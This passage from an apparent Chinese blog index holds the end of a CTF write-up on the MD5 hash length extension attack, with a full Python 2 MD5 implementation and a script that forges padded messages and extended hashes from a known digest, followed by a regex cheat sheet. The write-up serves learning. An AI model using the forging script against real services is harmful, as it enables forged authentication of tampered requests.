class="string">            input_msg : inputed a ascii-encoded string</span></span><br><span class="line"><span class="string">    --return:</span></span><br><span class="line"><span class="string">            a hex-encoded string which can be inputed to mathematical transformation function.</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line">    ascii_list = [x.encode(<span class="string">"hex"</span>) <span class="keyword">for</span> x <span class="keyword">in</span> input_msg]</span><br><span class="line">    length_msg_bytes = len(ascii_list)</span><br><span class="line">    length_msg_bits = len(ascii_list)*<span class="number">8</span></span><br><span class="line">    <span class="comment">#padding</span></span><br><span class="line">    ascii_list.append(<span class="string">'80'</span>)  </span><br><span class="line">    <span class="keyword">while</span> (len(ascii_list)*<span class="number">8</span>+<span class="number">64</span>)%<span class="number">512</span> != <span class="number">0</span>:  </span><br><span class="line">        ascii_list.append(<span class="string">'00'</span>)</span><br><span class="line">    <span class="comment">#add Descriptor</span></span><br><span class="line">    ascii_list.append(reverse_hex_8bytes(genMsgLengthDescriptor(length_msg_bits)))</span><br><span class="line">    <span class="keyword">return</span> <span class="string">""</span>.join(ascii_list)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getM16</span><span class="params">(hex_str,operatingBlockNum)</span>:</span></span><br><span class="line">    <span class="string">'''</span></span><br><span class="line"><span class="string">    --args:</span></span><br><span class="line"><span class="string">            hex_str : a hex-encoded string with length in integral multiple of 512bits</span></span><br><span class="line"><span class="string">            operatingBlockNum : message block number which is being operated , greater than 1</span></span><br><span class="line"><span class="string">    --return:</span></span><br><span class="line"><span class="string">            M : result of splited 64bytes into 4*16 message blocks with little-endian</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line">    M = [int(reverse_hex_4bytes(hex_str[i:(i+<span class="number">8</span>)]),<span class="number">16</span>) <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">128</span>*(operatingBlockNum<span class="number">-1</span>),<span class="number">128</span>*operatingBlockNum,<span class="number">8</span>)]</span><br><span class="line">    <span class="keyword">return</span> M</span><br><span class="line"></span><br><span class="line"><span class="comment">#定义函数，用来产生常数T[i]，常数有可能超过32位，同样需要&amp;0xffffffff操作。注意返回的是十进制的数</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">T</span><span class="params">(i)</span>:</span></span><br><span class="line">    result = (int(<span class="number">4294967296</span>*abs(__import__(<span class="string">"math"</span>).sin(i))))&amp;<span class="number">0xffffffff</span></span><br><span class="line">    <span class="keyword">return</span> result   </span><br><span class="line"></span><br><span class="line"><span class="comment">#定义每轮中用到的函数</span></span><br><span class="line"><span class="comment">#RL为循环左移，注意左移之后可能会超过32位，所以要和0xffffffff做与运算，确保结果为32位</span></span><br><span class="line">F = <span class="keyword">lambda</span> x,y,z:((x&amp;y)|((~x)&amp;z))</span><br><span class="line">G = <span class="keyword">lambda</span> x,y,z:((x&amp;z)|(y&amp;(~z)))</span><br><span class="line">H = <span class="keyword">lambda</span> x,y,z:(x^y^z)</span><br><span class="line">I = <span class="keyword">lambda</span> x,y,z:(y^(x|(~z)))</span><br><span class="line">RL = L = <span class="keyword">lambda</span> x,n:(((x&lt;&lt;n)|(x&gt;&gt;(<span class="number">32</span>-n)))&amp;(<span class="number">0xffffffff</span>))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">FF</span><span class="params">(a, b, c, d, x, s, ac)</span>:</span>  </span><br><span class="line">    a = (a+F ((b), (c), (d)) + (x) + (ac)&amp;<span class="number">0xffffffff</span>)&amp;<span class="number">0xffffffff</span>;  </span><br><span class="line">    a = RL ((a), (s))&amp;<span class="number">0xffffffff</span>;  </span><br><span class="line">    a = (a+b)&amp;<span class="number">0xffffffff</span>  </span><br><span class="line">    <span class="keyword">return</span> a  </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">GG</span><span class="params">(a, b, c, d, x, s, ac)</span>:</span>  </span><br><span class="line">    a = (a+G ((b), (c), (d)) + (x) + (ac)&amp;<span class="number">0xffffffff</span>)&amp;<span class="number">0xffffffff</span>;  </span><br><span class="line">    a = RL ((a), (s))&amp;<span class="number">0xffffffff</span>;  </span><br><span class="line">    a = (a+b)&amp;<span class="number">0xffffffff</span>  </span><br><span class="line">    <span class="keyword">return</span> a  </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">HH</span><span class="params">(a, b, c, d, x, s, ac)</span>:</span>  </span><br><span class="line">    a = (a+H ((b), (c), (d)) + (x) + (ac)&amp;<span class="number">0xffffffff</span>)&amp;<span class="number">0xffffffff</span>;  </span><br><span class="line">    a = RL ((a), (s))&amp;<span class="number">0xffffffff</span>;  </span><br><span class="line">    a = (a+b)&amp;<span class="number">0xffffffff</span>  </span><br><span class="line">    <span class="keyword">return</span> a  </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">II</span><span class="params">(a, b, c, d, x, s, ac)</span>:</span>  </span><br><span class="line">    a = (a+I ((b), (c), (d)) + (x) + (ac)&amp;<span class="number">0xffffffff</span>)&amp;<span class="number">0xffffffff</span>;  </span><br><span class="line">    a = RL ((a), (s))&amp;<span class="number">0xffffffff</span>;  </span><br><span class="line">    a = (a+b)&amp;<span class="number">0xffffffff</span>  </span><br><span class="line">    <span class="keyword">return</span> a      </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show_md5</span><span class="params">(A,B,C,D)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">""</span>.join( [  <span class="string">""</span>.join(__import__(<span class="string">"re"</span>).findall(<span class="string">r".."</span>,<span class="string">"%08x"</span>%i)[::<span class="number">-1</span>]) <span class="keyword">for</span> i <span class="keyword">in</span> (A,B,C,D)  ]  )</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">run_md5</span><span class="params">(A=<span class="number">0x67452301</span>,B=<span class="number">0xefcdab89</span>,C=<span class="number">0x98badcfe</span>,D=<span class="number">0x10325476</span>,readyMsg=<span class="string">""</span>)</span>:</span></span><br><span class="line">    </span><br><span class="line">    a = A</span><br><span class="line">    b = B</span><br><span class="line">    c = C</span><br><span class="line">    d = D</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">0</span>,len(readyMsg)/<span class="number">128</span>):</span><br><span class="line">        M = getM16(readyMsg,i+<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">16</span>):</span><br><span class="line">            <span class="keyword">exec</span> <span class="string">"M"</span>+str(i)+<span class="string">"=M["</span>+str(i)+<span class="string">"]"</span></span><br><span class="line">        <span class="comment">#First round</span></span><br><span class="line">        a=FF(a,b,c,d,M0,<span class="number">7</span>,<span class="number">0xd76aa478L</span>)</span><br><span class="line">        d=FF(d,a,b,c,M1,<span class="number">12</span>,<span class="number">0xe8c7b756L</span>)</span><br><span class="line">        c=FF(c,d,a,b,M2,<span class="number">17</span>,<span class="number">0x242070dbL</span>)</span><br><span class="line">        b=FF(b,c,d,a,M3,<span class="number">22</span>,<span class="number">0xc1bdceeeL</span>)</span><br><span class="line">        a=FF(a,b,c,d,M4,<span class="number">7</span>,<span class="number">0xf57c0fafL</span>)</span><br><span class="line">        d=FF(d,a,b,c,M5,<span class="number">12</span>,<span class="number">0x4787c62aL</span>)</span><br><span class="line">        c=FF(c,d,a,b,M6,<span class="number">17</span>,<span class="number">0xa8304613L</span>)</span><br><span class="line">        b=FF(b,c,d,a,M7,<span class="number">22</span>,<span class="number">0xfd469501L</span>)</span><br><span class="line">        a=FF(a,b,c,d,M8,<span class="number">7</span>,<span class="number">0x698098d8L</span>)</span><br><span class="line">        d=FF(d,a,b,c,M9,<span class="number">12</span>,<span class="number">0x8b44f7afL</span>)</span><br><span class="line">        c=FF(c,d,a,b,M10,<span class="number">17</span>,<span class="number">0xffff5bb1L</span>)</span><br><span class="line">        b=FF(b,c,d,a,M11,<span class="number">22</span>,<span class="number">0x895cd7beL</span>)</span><br><span class="line">        a=FF(a,b,c,d,M12,<span class="number">7</span>,<span class="number">0x6b901122L</span>)</span><br><span class="line">        d=FF(d,a,b,c,M13,<span class="number">12</span>,<span class="number">0xfd987193L</span>)</span><br><span class="line">        c=FF(c,d,a,b,M14,<span class="number">17</span>,<span class="number">0xa679438eL</span>)</span><br><span class="line">        b=FF(b,c,d,a,M15,<span class="number">22</span>,<span class="number">0x49b40821L</span>)</span><br><span class="line">        <span class="comment">#Second round</span></span><br><span class="line">        a=GG(a,b,c,d,M1,<span class="number">5</span>,<span class="number">0xf61e2562L</span>)</span><br><span class="line">        d=GG(d,a,b,c,M6,<span class="number">9</span>,<span class="number">0xc040b340L</span>)</span><br><span class="line">        c=GG(c,d,a,b,M11,<span class="number">14</span>,<span class="number">0x265e5a51L</span>)</span><br><span class="line">        b=GG(b,c,d,a,M0,<span class="number">20</span>,<span class="number">0xe9b6c7aaL</span>)</span><br><span class="line">        a=GG(a,b,c,d,M5,<span class="number">5</span>,<span class="number">0xd62f105dL</span>)</span><br><span class="line">        d=GG(d,a,b,c,M10,<span class="number">9</span>,<span class="number">0x02441453L</span>)</span><br><span class="line">        c=GG(c,d,a,b,M15,<span class="number">14</span>,<span class="number">0xd8a1e681L</span>)</span><br><span class="line">        b=GG(b,c,d,a,M4,<span class="number">20</span>,<span class="number">0xe7d3fbc8L</span>)</span><br><span class="line">        a=GG(a,b,c,d,M9,<span class="number">5</span>,<span class="number">0x21e1cde6L</span>)</span><br><span class="line">        d=GG(d,a,b,c,M14,<span class="number">9</span>,<span class="number">0xc33707d6L</span>)</span><br><span class="line">        c=GG(c,d,a,b,M3,<span class="number">14</span>,<span class="number">0xf4d50d87L</span>)</span><br><span class="line">        b=GG(b,c,d,a,M8,<span class="number">20</span>,<span class="number">0x455a14edL</span>)</span><br><span class="line">        a=GG(a,b,c,d,M13,<span class="number">5</span>,<span class="number">0xa9e3e905L</span>)</span><br><span class="line">        d=GG(d,a,b,c,M2,<span class="number">9</span>,<span class="number">0xfcefa3f8L</span>)</span><br><span class="line">        c=GG(c,d,a,b,M7,<span class="number">14</span>,<span class="number">0x676f02d9L</span>)</span><br><span class="line">        b=GG(b,c,d,a,M12,<span class="number">20</span>,<span class="number">0x8d2a4c8aL</span>)</span><br><span class="line">        <span class="comment">#Third round</span></span><br><span class="line">        a=HH(a,b,c,d,M5,<span class="number">4</span>,<span class="number">0xfffa3942L</span>)</span><br><span class="line">        d=HH(d,a,b,c,M8,<span class="number">11</span>,<span class="number">0x8771f681L</span>)</span><br><span class="line">        c=HH(c,d,a,b,M11,<span class="number">16</span>,<span class="number">0x6d9d6122L</span>)</span><br><span class="line">        b=HH(b,c,d,a,M14,<span class="number">23</span>,<span class="number">0xfde5380c</span>)</span><br><span class="line">        a=HH(a,b,c,d,M1,<span class="number">4</span>,<span class="number">0xa4beea44L</span>)</span><br><span class="line">        d=HH(d,a,b,c,M4,<span class="number">11</span>,<span class="number">0x4bdecfa9L</span>)</span><br><span class="line">        c=HH(c,d,a,b,M7,<span class="number">16</span>,<span class="number">0xf6bb4b60L</span>)</span><br><span class="line">        b=HH(b,c,d,a,M10,<span class="number">23</span>,<span class="number">0xbebfbc70L</span>)</span><br><span class="line">        a=HH(a,b,c,d,M13,<span class="number">4</span>,<span class="number">0x289b7ec6L</span>)</span><br><span class="line">        d=HH(d,a,b,c,M0,<span class="number">11</span>,<span class="number">0xeaa127faL</span>)</span><br><span class="line">        c=HH(c,d,a,b,M3,<span class="number">16</span>,<span class="number">0xd4ef3085L</span>)</span><br><span class="line">        b=HH(b,c,d,a,M6,<span class="number">23</span>,<span class="number">0x04881d05L</span>)</span><br><span class="line">        a=HH(a,b,c,d,M9,<span class="number">4</span>,<span class="number">0xd9d4d039L</span>)</span><br><span class="line">        d=HH(d,a,b,c,M12,<span class="number">11</span>,<span class="number">0xe6db99e5L</span>)</span><br><span class="line">        c=HH(c,d,a,b,M15,<span class="number">16</span>,<span class="number">0x1fa27cf8L</span>)</span><br><span class="line">        b=HH(b,c,d,a,M2,<span class="number">23</span>,<span class="number">0xc4ac5665L</span>)</span><br><span class="line">        <span class="comment">#Fourth round</span></span><br><span class="line">        a=II(a,b,c,d,M0,<span class="number">6</span>,<span class="number">0xf4292244L</span>)</span><br><span class="line">        d=II(d,a,b,c,M7,<span class="number">10</span>,<span class="number">0x432aff97L</span>)</span><br><span class="line">        c=II(c,d,a,b,M14,<span class="number">15</span>,<span class="number">0xab9423a7L</span>)</span><br><span class="line">        b=II(b,c,d,a,M5,<span class="number">21</span>,<span class="number">0xfc93a039L</span>)</span><br><span class="line">        a=II(a,b,c,d,M12,<span class="number">6</span>,<span class="number">0x655b59c3L</span>)</span><br><span class="line">        d=II(d,a,b,c,M3,<span class="number">10</span>,<span class="number">0x8f0ccc92L</span>)</span><br><span class="line">        c=II(c,d,a,b,M10,<span class="number">15</span>,<span class="number">0xffeff47dL</span>)</span><br><span class="line">        b=II(b,c,d,a,M1,<span class="number">21</span>,<span class="number">0x85845dd1L</span>)</span><br><span class="line">        a=II(a,b,c,d,M8,<span class="number">6</span>,<span class="number">0x6fa87e4fL</span>)</span><br><span class="line">        d=II(d,a,b,c,M15,<span class="number">10</span>,<span class="number">0xfe2ce6e0L</span>)</span><br><span class="line">        c=II(c,d,a,b,M6,<span class="number">15</span>,<span class="number">0xa3014314L</span>)</span><br><span class="line">        b=II(b,c,d,a,M13,<span class="number">21</span>,<span class="number">0x4e0811a1L</span>)</span><br><span class="line">        a=II(a,b,c,d,M4,<span class="number">6</span>,<span class="number">0xf7537e82L</span>)</span><br><span class="line">        d=II(d,a,b,c,M11,<span class="number">10</span>,<span class="number">0xbd3af235L</span>)</span><br><span class="line">        c=II(c,d,a,b,M2,<span class="number">15</span>,<span class="number">0x2ad7d2bbL</span>)</span><br><span class="line">        b=II(b,c,d,a,M9,<span class="number">21</span>,<span class="number">0xeb86d391L</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        A += a</span><br><span class="line">        B += b</span><br><span class="line">        C += c</span><br><span class="line">        D += d</span><br><span class="line"></span><br><span class="line">        A = A&amp;<span class="number">0xffffffff</span></span><br><span class="line">        B = B&amp;<span class="number">0xffffffff</span></span><br><span class="line">        C = C&amp;<span class="number">0xffffffff</span></span><br><span class="line">        D = D&amp;<span class="number">0xffffffff</span></span><br><span class="line"></span><br><span class="line">        a = A</span><br><span class="line">        b = B</span><br><span class="line">        c = C</span><br><span class="line">        d = D</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"%x,%x,%x,%x"</span>%(a,b,c,d)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> show_md5(a,b,c,d)</span><br></pre></td></tr></table></figure><h3 id="test-py"><a href="#test-py" class="headerlink" title="test.py"></a>test.py</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> my_md5</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> six</span><br><span class="line">MD5_Hash=sys.argv[<span class="number">1</span>]</span><br><span class="line">length=int(sys.argv[<span class="number">2</span>])</span><br><span class="line">text=sys.argv[<span class="number">3</span>]</span><br><span class="line"></span><br><span class="line">s1=eval(<span class="string">'0x'</span>+MD5_Hash[:<span class="number">8</span>].decode(<span class="string">'hex'</span>)[::<span class="number">-1</span>].encode(<span class="string">'hex'</span>))</span><br><span class="line">s2=eval(<span class="string">'0x'</span>+MD5_Hash[<span class="number">8</span>:<span class="number">16</span>].decode(<span class="string">'hex'</span>)[::<span class="number">-1</span>].encode(<span class="string">'hex'</span>))</span><br><span class="line">s3=eval(<span class="string">'0x'</span>+MD5_Hash[<span class="number">16</span>:<span class="number">24</span>].decode(<span class="string">'hex'</span>)[::<span class="number">-1</span>].encode(<span class="string">'hex'</span>))</span><br><span class="line">s4=eval(<span class="string">'0x'</span>+MD5_Hash[<span class="number">24</span>:<span class="number">32</span>].decode(<span class="string">'hex'</span>)[::<span class="number">-1</span>].encode(<span class="string">'hex'</span>))</span><br><span class="line"></span><br><span class="line">secret = <span class="string">"a"</span>*length</span><br><span class="line">test=secret+<span class="string">'\x80'</span>+<span class="string">'\x00'</span>*((<span class="number">512</span>-length*<span class="number">8</span><span class="number">-8</span><span class="number">-8</span>*<span class="number">8</span>)/<span class="number">8</span>)+six.int2byte(length*<span class="number">8</span>)+<span class="string">'\x00\x00\x00\x00\x00\x00\x00'</span>+text</span><br><span class="line">s = my_md5.deal_rawInputMsg(test)</span><br><span class="line">r = my_md5.deal_rawInputMsg(secret)</span><br><span class="line">inp = s[len(r):]</span><br><span class="line"><span class="keyword">print</span> <span class="string">'填充完的数据为:'</span>+test+<span class="string">'\n'</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">'----------------------------------------------------------'</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">'扩充完的数据为(16进制):'</span>+s</span><br><span class="line"><span class="keyword">print</span> <span class="string">'----------------------------------------------------------'</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">'截取最后分组的数据(16进制):'</span>+inp</span><br><span class="line"><span class="keyword">print</span> <span class="string">'----------------------------------------------------------'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span>  <span class="string">'最终填充结果为:'</span>+bytes(test).encode(<span class="string">'hex'</span>)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"填充后的md5为:"</span>+my_md5.run_md5(s1,s2,s3,s4,inp)</span><br></pre></td></tr></table></figure><p>脚本使用时第一个命令行参数是一个服务端加密一个固定长度数据的md5，第二个参数是固定的长度<br>例如已知服务端加密一个15字符的md5：test.py 571580b26c65f306376d4f64e53cb5c7 15</p><h4 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h4><p><a href="https://www.cnblogs.com/p00mj/p/6288337.html" target="_blank" rel="noopener">MD5的Hash长度扩展攻击</a></p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> md5 </tag>
            
            <tag> hash </tag>
            
            <tag> attack </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>简单正则表达式使用</title>
      <link href="/2018/simple-regular-expression-use.html"/>
      <url>/2018/simple-regular-expression-use.html</url>
      
        <content type="html"><![CDATA[<p>这里做一个笔记，整理了各大网站里关于正则表达式的知识，以备后面查询。<br>主要涉及两个方面：</p><ol><li>正则表达式书写规则</li><li>常用正则表达式<a id="more"></a></li></ol><h2 id="正则表达式简单用法"><a href="#正则表达式简单用法" class="headerlink" title="正则表达式简单用法"></a>正则表达式简单用法</h2><p>常用元字符</p><table><thead><tr><th align="left">代码</th><th align="left">说明</th></tr></thead><tbody><tr><td align="left">.</td><td align="left">匹配除换行符以外的任意字符</td></tr><tr><td align="left">\w</td><td align="left">匹配字母或数字或下划线</td></tr><tr><td align="left">\s</td><td align="left">匹配任意的空白符</td></tr><tr><td align="left">\d</td><td align="left">匹配数字</td></tr><tr><td align="left">\b</td><td align="left">匹配单词的开始或结束</td></tr><tr><td align="left">^</td><td align="left">匹配字符串的开始</td></tr><tr><td align="left">$</td><td align="left">匹配字符串的结束</td></tr></tbody></table><p>常用限定符</p><table><thead><tr><th align="left">代码/语法</th><th align="left">说明</th></tr></thead><tbody><tr><td align="left">*</td><td align="left">重复零次或更多次</td></tr><tr><td align="left">+</td><td align="left">重复一次或更多次</td></tr><tr><td align="left">?</td><td align="left">重复零次或一次</td></tr><tr><td align="left">{n}</td><td align="left">重复n次</td></tr><tr><td align="left">{n,}</td><td align="left">重复n次或更多次</td></tr><tr><td align="left">{n,m}</td><td align="left">重复n到m次</td></tr></tbody></table><p>常用反义词</p><table><thead><tr><th align="left">代码/语法</th><th align="left">说明</th></tr></thead><tbody><tr><td align="left">\W</td><td align="left">匹配任意不是字母，数字，下划线，汉字的字符</td></tr><tr><td align="left">\S</td><td align="left">匹配任意不是空白符的字符</td></tr><tr><td align="left">\D</td><td align="left">匹配任意非数字的字符</td></tr><tr><td align="left">\B</td><td align="left">匹配不是单词开头或结束的位置</td></tr><tr><td align="left">[^x]</td><td align="left">匹配除了x以外的任意字符</td></tr><tr><td align="left">[^aeiou]</td><td align="left">匹配除了aeiou这几个字母以外的任意字符</td></tr></tbody></table><!-- ## 常用正则表达式<div>        <h2>一、校验数字的表达式</h2><ul><li>数字：<strong>^[0-9]*$</strong></li><li> n位的数字：<strong>^\d{n}$</strong></li><li> 至少n位的数字<strong>：^\d{n,}$</strong></li><li> m-n位的数字：<strong>^\d{m,n}$</strong></li><li> 零和非零开头的数字：<strong>^(0 | [1-9][0-9]*)$</strong></li><li> 非零开头的最多带两位小数的数字：<strong>^([1-9][0-9]*)+(\.[0-9]{1,2})?$</strong></li><li> 带1-2位小数的正数或负数：<strong>^(\-)?\d+(\.\d{1,2})$</strong></li><li> 正数、负数、和小数：<strong>^(\- | \+)?\d+(\.\d+)?$</strong></li><li> 有两位小数的正实数：<strong>^[0-9]+(\.[0-9]{2})?$</strong></li><li> 有1~3位小数的正实数：<strong>^[0-9]+(\.[0-9]{1,3})?$</strong></li><li> 非零的正整数：<strong>^[1-9]\d*$ 或 ^([1-9][0-9]*){1,3}$ 或 ^\+?[1-9][0-9]*$</strong></li><li> 非零的负整数：<strong>^\-[1-9][]0-9"*$ 或 ^-[1-9]\d*$</strong></li><li> 非负整数：<strong>^\d+$ 或 ^[1-9]\d* | 0$</strong></li><li> 非正整数：<strong>^-[1-9]\d* | 0$ 或 ^((-\d+) | (0+))$</strong></li><li> 非负浮点数：<strong>^\d+(\.\d+)?$ 或 ^[1-9]\d*\.\d* | 0\.\d*[1-9]\d* | 0?\.0+ | 0$</strong></li><li> 非正浮点数：<strong>^((-\d+(\.\d+)?) | (0+(\.0+)?))$ 或 ^(-([1-9]\d*\.\d* | 0\.\d*[1-9]\d*)) | 0?\.0+ | 0$</strong></li><li> 正浮点数：<strong>^[1-9]\d*\.\d* | 0\.\d*[1-9]\d*$ 或 ^(([0-9]+\.[0-9]*[1-9][0-9]*) | ([0-9]*[1-9][0-9]*\.[0-9]+) | ([0-9]*[1-9][0-9]*))$</strong></li><li> 负浮点数：<strong>^-([1-9]\d*\.\d* | 0\.\d*[1-9]\d*)$ 或 ^(-(([0-9]+\.[0-9]*[1-9][0-9]*) | ([0-9]*[1-9][0-9]*\.[0-9]+) | ([0-9]*[1-9][0-9]*)))$</strong></li><li> 浮点数：<strong>^(-?\d+)(\.\d+)?$ 或 ^-?([1-9]\d*\.\d* | 0\.\d*[1-9]\d* | 0?\.0+ | 0)$</strong></li></ul><hr><h2>二、校验字符的表达式</h2><ul><li>汉字：<strong>^[\u4e00-\u9fa5]{0,}$</strong></li><li>英文和数字：<strong>^[A-Za-z0-9]+$ 或 ^[A-Za-z0-9]{4,40}$</strong></li><li>长度为3-20的所有字符：<strong>^.{3,20}$</strong></li><li>由26个英文字母组成的字符串：<strong>^[A-Za-z]+$</strong></li><li>由26个大写英文字母组成的字符串：<strong>^[A-Z]+$</strong></li><li>由26个小写英文字母组成的字符串：<strong>^[a-z]+$</strong></li><li>由数字和26个英文字母组成的字符串：<strong>^[A-Za-z0-9]+$</strong></li><li>由数字、26个英文字母或者下划线组成的字符串：<strong>^\w+$ 或 ^\w{3,20}$</strong></li><li>中文、英文、数字包括下划线：<strong>^[\u4E00-\u9FA5A-Za-z0-9_]+$</strong></li><li>中文、英文、数字但不包括下划线等符号：<strong>^[\u4E00-\u9FA5A-Za-z0-9]+$ 或 ^[\u4E00-\u9FA5A-Za-z0-9]{2,20}$</strong></li><li>可以输入含有^%&',;=?$\"等字符：<strong>[^%&',;=?$\x22]+</strong></li><li>禁止输入含有~的字符：<strong>[^~\x22]+</strong></li></ul><hr><h2>三、特殊需求表达式</h2><ul><li>Email地址：<strong>^\w+([-+.]\w+)*@\w+([-.]\w+)*\.\w+([-.]\w+)*$</strong></li><li>域名：<strong>[a-zA-Z0-9][-a-zA-Z0-9]{0,62}(/.[a-zA-Z0-9][-a-zA-Z0-9]{0,62})+/.?</strong></li><li>InternetURL：<strong>[a-zA-z]+://[^\s]* 或 ^http://([\w-]+\.)+[\w-]+(/[\w-./?%&=]*)?$</strong></li><li>手机号码：<strong>^(13[0-9] | 14[5 | 7] | 15[0 | 1 | 2 | 3 | 5 | 6 | 7 | 8 | 9] | 18[0 | 1 | 2 | 3 | 5 | 6 | 7 | 8 | 9])\d{8}$</strong></li><li>电话号码("XXX-XXXXXXX"、"XXXX-XXXXXXXX"、"XXX-XXXXXXX"、"XXX-XXXXXXXX"、"XXXXXXX"和"XXXXXXXX)：<strong>^(\(\d{3,4}-) | \d{3.4}-)?\d{7,8}$ </strong></li><li>国内电话号码(0511-4405222、021-87888822)：<strong>\d{3}-\d{8} | \d{4}-\d{7}</strong></li><li>电话号码正则表达式（支持手机号码，3-4位区号，7-8位直播号码，1－4位分机号）: <strong>((\d{11}) | ^((\d{7,8}) | (\d{4} | \d{3})-(\d{7,8}) | (\d{4} | \d{3})-(\d{7,8})-(\d{4} | \d{3} | \d{2} | \d{1}) | (\d{7,8})-(\d{4} | \d{3} | \d{2} | \d{1}))$)</strong></li><li>身份证号(15位、18位数字)，最后一位是校验位，可能为数字或字符X：<strong>(^\d{15}$) | (^\d{18}$) | (^\d{17}(\d | X | x)$)</strong></li><li>帐号是否合法(字母开头，允许5-16字节，允许字母数字下划线)：<strong>^[a-zA-Z][a-zA-Z0-9_]{4,15}$</strong></li><li>密码(以字母开头，长度在6~18之间，只能包含字母、数字和下划线)：<strong>^[a-zA-Z]\w{5,17}$</strong></li><li>强密码(必须包含大小写字母和数字的组合，不能使用特殊字符，长度在 8-10 之间)：<strong>^(?=.*\d)(?=.*[a-z])(?=.*[A-Z])[a-zA-Z0-9]{8,10}$  </strong></li><li>强密码(必须包含大小写字母和数字的组合，可以使用特殊字符，长度在8-10之间)：<strong>^(?=.*\d)(?=.*[a-z])(?=.*[A-Z]).{8,10}$  </strong></li><li>日期格式：<strong>^\d{4}-\d{1,2}-\d{1,2}</strong></li><li>一年的12个月(01～09和1～12)：<strong>^(0?[1-9] | 1[0-2])$</strong></li><li>一个月的31天(01～09和1～31)：<strong>^((0?[1-9]) | ((1 | 2)[0-9]) | 30 | 31)$ </strong></li><li>钱的输入格式：<ol><li>    有四种钱的表示形式我们可以接受:"10000.00" 和 "10,000.00", 和没有 "分" 的 "10000" 和 "10,000"：<strong>^[1-9][0-9]*$ </strong></li><li>    这表示任意一个不以0开头的数字,但是,这也意味着一个字符"0"不通过,所以我们采用下面的形式：<strong>^(0 | [1-9][0-9]*)$ </strong></li><li>    一个0或者一个不以0开头的数字.我们还可以允许开头有一个负号：<strong>^(0 | -?[1-9][0-9]*)$ </strong></li><li>    这表示一个0或者一个可能为负的开头不为0的数字.让用户以0开头好了.把负号的也去掉,因为钱总不能是负的吧。下面我们要加的是说明可能的小数部分：<strong>^[0-9]+(.[0-9]+)?$ </strong></li><li>    必须说明的是,小数点后面至少应该有1位数,所以"10."是不通过的,但是 "10" 和 "10.2" 是通过的：<strong>^[0-9]+(.[0-9]{2})?$ </strong></li><li>    这样我们规定小数点后面必须有两位,如果你认为太苛刻了,可以这样：<strong>^[0-9]+(.[0-9]{1,2})?$ </strong></li><li>    这样就允许用户只写一位小数.下面我们该考虑数字中的逗号了,我们可以这样：<strong>^[0-9]{1,3}(,[0-9]{3})*(.[0-9]{1,2})?$ </strong></li><li>    1到3个数字,后面跟着任意个 逗号+3个数字,逗号成为可选,而不是必须：<strong>^([0-9]+ | [0-9]{1,3}(,[0-9]{3})*)(.[0-9]{1,2})?$ </strong></li><li>    备注：这就是最终结果了,别忘了"+"可以用"*"替代如果你觉得空字符串也可以接受的话(奇怪,为什么?)最后,别忘了在用函数时去掉去掉那个反斜杠,一般的错误都在这里</li></ol></li><li>xml文件：<strong>^([a-zA-Z]+-?)+[a-zA-Z0-9]+\\.[x | X][m | M][l | L]$</strong></li><li>中文字符的正则表达式：<strong>[\u4e00-\u9fa5]</strong></li><li>双字节字符：<strong>[^\x00-\xff]    (包括汉字在内，可以用来计算字符串的长度(一个双字节字符长度计2，ASCII字符计1))</strong></li><li>空白行的正则表达式：<strong>\n\s*\r    (可以用来删除空白行)</strong></li><li>HTML标记的正则表达式：<strong><(\S*?)[^>]*>.*?</\1> | <.*? />    (首尾空白字符的正则表达式：^\s* | \s*$或(^\s*) | (\s*$)    (可以用来删除行首行尾的空白字符(包括空格、制表符、换页符等等)，非常有用的表达式)</strong></li><li>腾讯QQ号：<strong>[1-9][0-9]{4,}    (腾讯QQ号从10000开始)</strong></li><li>中国邮政编码：<strong>[1-9]\d{5}(?!\d)    (中国邮政编码为6位数字)</strong></li><li>IP地址：<strong>((?:(?:25[0-5] | 2[0-4]\\d | [01]?\\d?\\d)\\.){3}(?:25[0-5] | 2[0-4]\\d | [01]?\\d?\\d)) </strong></li></ul></div>--><h2 id="正则表达式学习网站"><a href="#正则表达式学习网站" class="headerlink" 